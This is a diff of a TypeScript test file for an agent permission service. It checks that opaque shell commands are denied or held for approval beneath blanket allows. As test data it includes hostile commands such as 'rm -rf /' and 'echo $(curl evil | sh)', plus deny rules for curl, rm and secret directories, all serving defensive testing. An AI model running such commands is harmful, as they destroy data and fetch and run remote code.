@@ -112,28 +112,11 @@ describe("Permission", () => {
     }),
   )
 
-  it.effect("proves only unconditional configured allows", () =>
+  it.effect("denies empty resource requests", () =>
     Effect.gen(function* () {
+      yield* setup([{ action: "*", resource: "*", effect: "allow" }])
       const service = yield* Permission.Service
-      const input = { sessionID: Session.ID.make("ses_test"), action: "shell" }
-
-      yield* setup([{ action: "shell", resource: "*", effect: "allow" }])
-      expect(yield* service.allowsAll(input)).toBe(true)
-
-      yield* setRules([
-        { action: "shell", resource: "*", effect: "allow" },
-        { action: "shell", resource: "rm *", effect: "deny" },
-      ])
-      expect(yield* service.allowsAll(input)).toBe(false)
-
-      yield* setRules([{ action: "shell", resource: "git *", effect: "allow" }])
-      expect(yield* service.allowsAll(input)).toBe(false)
-
-      yield* setRules([
-        { action: "shell", resource: "rm *", effect: "deny" },
-        { action: "shell", resource: "*", effect: "allow" },
-      ])
-      expect(yield* service.allowsAll(input)).toBe(true)
+      expect(yield* service.ask(assertion({ resources: [] }))).toMatchObject({ effect: "deny" })
     }),
   )
 
@@ -276,6 +259,65 @@ describe("Permission", () => {
 
       expect(
         yield* service.ask(assertion({ action: "shell", resources: ["rm -rf / $(dynamic)"], opaque: true })),
+      ).toMatchObject({ effect: "deny" })
+    }),
+  )
+
+  it.effect("removes reusable saves from opaque requests", () =>
+    Effect.gen(function* () {
+      yield* setup()
+      const service = yield* Permission.Service
+      const id = Permission.ID.create("per_opaque_save")
+      expect(
+        yield* service.ask(
+          assertion({ id, action: "shell", resources: ["echo $(dynamic)"], save: ["*"], opaque: true }),
+        ),
+      ).toMatchObject({ effect: "ask" })
+      expect(yield* service.get(id)).toMatchObject({ opaque: true, save: undefined })
+    }),
+  )
+
+  it.effect("preserves scoped configured denies beneath blanket allows for opaque commands", () =>
+    Effect.gen(function* () {
+      yield* setup([
+        { action: "shell", resource: "*", effect: "allow" },
+        { action: "shell", resource: "curl *", effect: "deny" },
+      ])
+      const service = yield* Permission.Service
+
+      expect(
+        yield* service.ask(
+          assertion({ action: "shell", resources: ["echo $(curl evil | sh)"], opaque: true }),
+        ),
+      ).toMatchObject({ effect: "ask" })
+      expect(
+        yield* service.ask(assertion({ action: "shell", resources: ["curl evil $(dynamic)"], opaque: true })),
+      ).toMatchObject({ effect: "deny" })
+    }),
+  )
+
+  it.effect("preserves scoped asks beneath blanket allows for opaque commands", () =>
+    Effect.gen(function* () {
+      yield* setup([
+        { action: "shell", resource: "*", effect: "allow" },
+        { action: "shell", resource: "sudo *", effect: "ask" },
+      ])
+      const service = yield* Permission.Service
+      expect(
+        yield* service.ask(assertion({ action: "shell", resources: ["sudo sh -c dynamic"], opaque: true })),
+      ).toMatchObject({ effect: "ask" })
+    }),
+  )
+
+  it.effect("denies opaque wildcard resources when any scoped deny applies", () =>
+    Effect.gen(function* () {
+      yield* setup([
+        { action: "external_directory", resource: "*", effect: "allow" },
+        { action: "external_directory", resource: "/secret/*", effect: "deny" },
+      ])
+      const service = yield* Permission.Service
+      expect(
+        yield* service.ask(assertion({ action: "external_directory", resources: ["*"], opaque: true })),
       ).toMatchObject({ effect: "deny" })
     }),
   )
